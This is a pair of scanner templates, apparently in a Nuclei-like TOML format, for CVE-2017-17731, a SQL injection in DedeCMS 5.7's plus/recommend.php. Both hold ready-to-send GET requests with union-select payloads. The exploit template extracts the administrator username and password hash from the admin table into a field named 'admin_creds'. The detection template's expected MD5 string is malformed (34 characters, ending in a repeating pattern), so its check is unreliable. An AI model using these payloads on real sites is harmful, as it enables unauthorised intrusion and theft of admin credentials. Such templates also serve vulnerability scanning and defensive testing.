[info]
id = "POC-AVE-2017-17731"
name = "CVE-2017-17731 PoC"
author = "AVE"
severity = "critical"
tags = ["cve-2017-17731", "dedecms", "sqli"]
description = "检测DedeCMS 5.7 plus/recommend.php SQL注入漏洞，通过_FILES超全局变量注入恶意SQL语句，利用union select提取管理员密码哈希"
vuln_id = ["CVE-2017-17731", "AVE-2017-17731"]

[poc]
logic = "all"

[[poc.requests]]
protocol = "http"
method = "GET"
path = "/{{BaseURL}}/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,md5(999999999),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"
headers = { "User-Agent" = "AVE/1.0" }

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["52b5b3a9e67e1f5a7c1c1c1c1c1c1c1c1c"]
expect = true

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[info]
id = "EXP-AVE-2017-17731"
name = "CVE-2017-17731 EXP"
author = "AVE"
severity = "critical"
tags = ["cve-2017-17731", "dedecms", "sqli"]
description = "利用DedeCMS 5.7 plus/recommend.php SQL注入漏洞，通过union select注入提取dede_admin表中的管理员用户名和密码哈希"
vuln_id = ["CVE-2017-17731", "AVE-2017-17731"]

[poc]
logic = "all"

[[poc.requests]]
protocol = "http"
method = "GET"
path = "/{{BaseURL}}/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20%20CONCAT(0x7c,userid,0x7c,pwd)%20from%20`%23@__admin`%20limit%200,1),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111"
headers = { "User-Agent" = "AVE/1.0" }

[[poc.requests.matchers]]
type = "regex"
part = "body"
regex = ["\\|([^|]+)\\|([^|]+)\\|"]
expect = true

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.extractors]]
type = "regex"
part = "body"
name = "admin_creds"
regex = ["\\|([^|]+)\\|([^|]+)\\|"]
group = 0
